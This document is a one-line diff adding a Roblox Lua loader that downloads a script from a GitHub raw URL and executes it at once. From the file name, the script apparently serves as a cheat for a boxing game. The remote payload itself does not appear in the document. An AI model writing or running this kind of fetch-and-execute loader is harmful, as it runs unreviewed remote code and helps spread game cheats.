@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/first-person-boxing-spam7-5tkhmwa7olc3xb.lua"))()
